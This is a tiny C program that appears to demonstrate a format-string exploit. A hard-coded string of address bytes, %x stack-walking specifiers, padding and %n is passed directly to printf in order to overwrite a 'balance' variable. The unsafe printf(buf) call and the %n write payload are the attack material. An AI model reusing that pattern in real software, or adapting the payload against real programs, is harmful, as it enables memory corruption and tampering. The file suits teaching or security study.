#include <stdio.h>

int main(int argc, char *argv[]) {
  int balance = 0;
  char buf[40] = "\xff\xd3\xff\xff %x %x %x %x %x %x %x %245504x %n";

  printf(buf);
  printf("Balance is: %d\n", balance);
}
